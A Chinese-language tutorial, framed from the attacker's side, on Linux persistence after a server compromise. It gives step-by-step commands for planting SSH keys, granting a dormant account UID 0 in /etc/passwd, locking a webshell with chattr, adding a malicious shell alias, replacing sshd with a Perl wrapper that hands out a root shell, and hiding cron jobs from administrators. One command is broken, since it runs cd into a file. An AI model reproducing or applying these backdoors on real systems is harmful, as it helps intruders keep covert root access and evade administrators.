前言

攻击者在获得服务器权限后，为了防止自己的 shell 失效会通过一些特殊技巧来进行权限维持，本文将介绍几种权限维持的技术。

01 ssh公钥

使用 ssh-keygen 命令生成一对公私钥 id_rsa、id_rsa.pub

然后把 id_rsa.pub 里面的内容放到 ~/.ssh/authorized_keys 文件里面去

cd ~/.ssh/authorized_keys
cat id_rsa.pub > authorized_keys
chmod 600 authorized_keys

注意：authorized_keys 的权限必须是 600 否则将无法使用密钥登录

这里可以配合一些其他的技巧达到相同的效果，先去 /etc/passwd 下查一下系统拥有哪些用户，然后去系统日志下查一下那个用户是不常登录的（也就是僵尸用户），采用如上方法生成 ssh 密钥，最后修改一下 /etc/passwd 使得这个用户的 uid 为 0 这个用户也就具有了 root 权限。

#Openssl创建账户  
openssl passwd -1 -salt user pass
$1$doufu$8Zu0f9N3CsuHJDQ3WSDH50       //生成的密码


#登录用户名 密码（x为安全考虑） 用户id（UID） 组ID（GID） 用户备注信息 用户家目录 用户的bash
root:x:0:0:root:/root:/usr/bin/zsh
root:$1$ml$4f1pj7IVHJfw9jP0qzcn60:0:0:root:/root:/bin/bash

02 不可删除的文件

这个方法可以用在 webshell 上面

chattr +i hack.php

03 alias后门

在 ~/.zshrc 文件最后追加 alias 命令

alias ls='whoami && /usr/bin/ls'
source .zshrc

在执行 ls 命令时 ，会先执行 whoami（这个地方可以换成恶意代码）然后再去执行 ls 命令（ls命令需要写绝对路径）。

04 ssh wrapper 后门

后门构建：目标机器执行

mv /usr/sbin/sshd /usr/bin/

vim /usr/bin/sshd

写入以下命令

#!/usr/bin/perl
exec"/bin/sh"if(getpeername(STDIN)=~/^..09/); //09 就是12345 端口
exec{"/usr/bin/sshd"}"/usr/sbin/sshd",@ARGV;

给予执行权限
chmod u+x /usr/bin/sshd

重启ssh服务
service sshd restart

05 计划任务后门

不能直接用 crontab -e 添加计划任务 ，否则管理员直接用 crontab -l 命令就能看到恶意内容。

在 /etc 目录下有这些计划任务文件夹，在任意一个下创建计划任务文件夹。

*/5 * * * *  ls     每隔五分钟用/usr/bin/sh执行一次 ls 命令

创建计划任务时可以配合上面的 ‘不可删除文件方法’和 alias 方法使用从而达到混淆的效果。
